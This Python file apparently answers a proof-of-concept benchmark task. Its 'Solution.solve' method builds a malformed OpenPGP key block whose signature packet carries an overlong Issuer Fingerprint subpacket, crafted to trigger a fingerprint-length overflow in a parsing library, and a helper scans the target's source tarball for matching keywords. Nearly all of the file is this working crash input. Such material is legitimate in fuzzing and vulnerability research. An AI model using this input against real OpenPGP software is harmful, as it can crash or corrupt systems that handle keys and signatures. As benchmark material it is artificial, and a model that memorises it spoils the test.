import os
import tarfile
from typing import Optional


def _u16be(x: int) -> bytes:
    return bytes([(x >> 8) & 0xFF, x & 0xFF])


def _u32be(x: int) -> bytes:
    return bytes([(x >> 24) & 0xFF, (x >> 16) & 0xFF, (x >> 8) & 0xFF, x & 0xFF])


def _newpkt_len(n: int) -> bytes:
    if n < 0:
        n = 0
    if n < 192:
        return bytes([n])
    if n <= 8383:
        n2 = n - 192
        return bytes([192 + (n2 >> 8), n2 & 0xFF])
    return b"\xFF" + _u32be(n)


def _newpkt(tag: int, body: bytes) -> bytes:
    tag &= 0x3F
    hdr = bytes([0xC0 | tag]) + _newpkt_len(len(body))
    return hdr + body


def _mpi_from_int(v: int) -> bytes:
    if v < 0:
        v = 0
    if v == 0:
        return b"\x00\x00"
    bitlen = v.bit_length()
    blen = (bitlen + 7) // 8
    return _u16be(bitlen) + v.to_bytes(blen, "big")


def _pubkey_packet_v4_rsa(n: int = 3, e: int = 3) -> bytes:
    body = bytes([4]) + b"\x00\x00\x00\x00" + bytes([1]) + _mpi_from_int(n) + _mpi_from_int(e)
    return _newpkt(6, body)


def _userid_packet(s: bytes = b"a") -> bytes:
    return _newpkt(13, s)


def _sig_packet_v4_with_issuer_fpr_overlong(fpr_len: int = 33, key_version: int = 4) -> bytes:
    if fpr_len < 0:
        fpr_len = 0
    if fpr_len > 65500:
        fpr_len = 65500

    # Hashed subpackets:
    #  - Signature Creation Time (type 2, 4 bytes)
    sp_creation = bytes([5, 2]) + b"\x00\x00\x00\x00"

    #  - Issuer Fingerprint (type 33, version + fingerprint bytes)
    fpr_data = bytes([key_version & 0xFF]) + (b"\xAA" * fpr_len)
    issuer_content_len = 1 + len(fpr_data)  # type + data
    if issuer_content_len < 192:
        sp_len = bytes([issuer_content_len])
    elif issuer_content_len <= 8383:
        n2 = issuer_content_len - 192
        sp_len = bytes([192 + (n2 >> 8), n2 & 0xFF])
    else:
        sp_len = b"\xFF" + _u32be(issuer_content_len)
    sp_issuer = sp_len + bytes([33]) + fpr_data

    hashed = sp_creation + sp_issuer
    hashed_len = _u16be(len(hashed))

    unhashed = b""
    unhashed_len = _u16be(0)

    # Minimal RSA signature MPI (invalid but parseable enough in many implementations)
    sig_mpi = _mpi_from_int(1)

    body = (
        bytes([4, 0x13, 1, 8])  # v4, positive certification, RSA, SHA256
        + hashed_len
        + hashed
        + unhashed_len
        + unhashed
        + b"\x00\x00"  # left 16 bits of hash
        + sig_mpi
    )
    return _newpkt(2, body)


def _looks_like_openpgp_source(src_path: str) -> Optional[bool]:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            hits = 0
            checked = 0
            for m in tf:
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (name.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".kt", ".py"))):
                    continue
                checked += 1
                if checked > 200:
                    break
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(200000)
                except Exception:
                    continue
                low = data.lower()
                if b"openpgp" in low:
                    hits += 1
                if b"fingerprint" in low and (b"overflow" in low or b"issuer" in low or b"subpacket" in low):
                    hits += 2
                if hits >= 3:
                    return True
            return None if checked == 0 else (hits > 0)
    except Exception:
        return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = _looks_like_openpgp_source(src_path)

        pk = _pubkey_packet_v4_rsa()
        uid = _userid_packet(b"a")
        sig = _sig_packet_v4_with_issuer_fpr_overlong(fpr_len=33, key_version=4)

        return pk + uid + sig